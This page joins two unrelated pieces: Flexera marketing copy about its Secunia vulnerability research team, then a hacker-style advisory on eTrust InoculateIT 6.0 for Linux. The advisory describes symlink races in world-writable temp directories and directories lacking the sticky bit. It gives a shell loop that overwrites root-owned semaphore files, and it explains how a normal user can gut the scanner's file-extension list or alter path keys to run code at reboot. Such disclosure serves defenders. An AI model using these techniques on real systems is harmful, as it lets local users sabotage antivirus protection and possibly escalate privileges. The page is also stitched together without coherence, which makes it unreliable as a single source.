How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

author: l0om  <l0om@excluded.org>
software: eTrust Virus Protection 6.0 InoculateIT for
linux

local phun with etrust antivirus 6.0 inoculateIT
linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

eTrust InnoculateIT 6.0 comes for the following OSes:
-windows 95/98/ME
-windows nt 4.0/2000
-novell netware 3.x 4.x 5.x
-lotus notes/domino
-mircosoft exchange server
-and finally linux (SuSE, RedHat, Caldera, Turbo
Linux)

eTrust is a antivirus program which can scan nearly
every fileformat
for viruses. i have installed the version for linux
on my SuSE 9.0 system
and noticed the following security flaws:

1) possible symlink attacks in some scripts

  by the way- the env variable $CAIGLBL0000 can be /
usr/local/eTrust/ for example.
  however - the $CAIGLGL0000/tmp IS world writable...

ino/scripts/inoregupdate
########################
[...]
tfn=$CAIGLBL0000/tmp/.inoreg.ns.$$
$NETSTAT -i 2>/dev/null | grep -v localhost > $tfn
[...]

scripts/uniftest
################
local=$CAIGLBL0000/tmp
local1=$CAIGLBL0000/scripts
[...]
    $CAIGLBL0000/bin/unips > $local/unips.$$
    awk -f $local1/uniftest.awk $local/unips.$$
    st_rc=$?
    rm $local/unips.$$
[...]

scripts/unimove
###############
           sed -e "s!$from!$to!g" $fn > /
tmp/.unimove.sed #<-- creats it now
           diff $fn /tmp/.unimove.sed > /dev/null
           if [ $? != 0 -a -s /tmp/.unimove.sed ];
then
                mv /tmp/.unimove.sed  $fn
           rm /tmp/.unimove.sed    # dels it if
finished

2) some directorys in /tmp dont have the sticky bit
set
an example:

eTrustAE.lnx/tmp/.caipcs/ # ls -l
drwxrwxrwx    8 root     root          240 2004-02-05
09:58 .
drwxrwxrwx    4 root     root          160 2004-02-09
16:53 ..
drwxrwxrwx    2 root     root           48 2004-02-05
09:54 .file
-rw-r--r--    1 root     root         4110 2004-02-05
09:58 ipcrm.log
drwxrwxrwx    2 root     root          856 2004-02-05
10:48 .nob_event
drwxrwxrwx    2 root     root         1168 2004-02-05
10:48 .nob_mutex
drwxrwxrwx    2 root     root           48 2004-02-05
09:54 .nob_sem
drwxrwxrwx    2 root     root          384 2004-02-05
10:48 .sem
drwxrwxrwx    2 root     root           80 2004-02-05
10:48 .shm

eTrustAE.lnx/tmp/.caipcs # ls -l .sem
drwxrwxrwx    2 root     root          384 2004-02-05
10:48 .
drwxrwxrwx    8 root     root          240 2004-02-05
09:58 ..
-rw-------    1 root     root           20 2004-02-05
10:01 3571729
-rw-------    1 root     root            5 2004-02-05
09:58 3702805
-rw-------    1 root     root           25 2004-02-05
10:01 3735574
-rw-------    1 root     root           25 2004-02-05
10:01 3768343
-rw-------    1 root     root           15 2004-02-05
09:58 3801112

this directory includes values which are kinda
sensetive. so only root can
read or write them as we can see at this
filepermissions.
but as the upper directory /.sem has no sticky bit
set and is world writeable.
we can simple overwrite these files as the directory
permissions are of a
higher priority as the file permissions. this is the
truth for a handful of
directorys.
for example:

badass~:> phun()
{
for i in `ls /usr/local/eTrustAE.lnx/
tmp/.caipcs/.sem`; do
cp -f ~/myblankass.ascii /usr/local/eTrustAE.lnx/
tmp/.caipcs/.sem/$i
done
echo jupp
}
badass~:> phun
jupp
badass~:>

3) world writeable

with the linux version of etrust there come some
directroys which we all know- the
"registry". it seems like the whole registry key is
world writeable:

>find ./ -type f -perm -2 -print
./registry/hkey_current_user/software/
computerassociates/inoculateit/6.0/local_scanner/
macro_cure_action
./registry/hkey_current_user/software/
computerassociates/inoculateit/6.0/local_scanner/
scan_files
./registry/hkey_current_user/software/
computerassociates/inoculateit/6.0/local_scanner/
log_infected_files
./registry/hkey_current_user/software/
computerassociates/inoculateit/6.0/local_scanner/
specified_list
./registry/hkey_local_machine/software/
computerassociates/scanengine/path/home
./registry/hkey_local_machine/software/
computerassociates/scanengine/path/logs
[...]

they got the sticky bit set, therefore we cannot
overwrite or delte them, but sometimes we can
change sensetive values in the registry. for example:

cat ./registry/hkey_current_user/software/
computerassociates/inoculateit/6.0/local_scanner/
specified_list
|COM|DLL|DOT|DOC|EXE|SYS|VXD|XLA|XLS|XLT|XLW|RTF|WIZ|
386|ADT|BIN|CBT|CLA|CPL|CSC|DRV|HTM|HTT|JS|MDB|MSO|
POT|
PPT|SCR|SHS|VBS|VSD|VST|VSS|OCX|HLP|CHM|MSI|VBE|JSE|
PIF|BAT|

this key contains a list of fileends which specifies
what files should be scaned for a virus.
a normal user can simply delte all values except one
from this list, and can make the scanner pretty
lame...
furthermore there are worldwritable keys like
"windows/currentversion", with keys which include the
path to
the normal binarys ("/usr/bin"). it may be possible
to execute whatever you want on a reboot if you
change
the right keys in the right way.

have phun!
	feel phree!
		life phat!
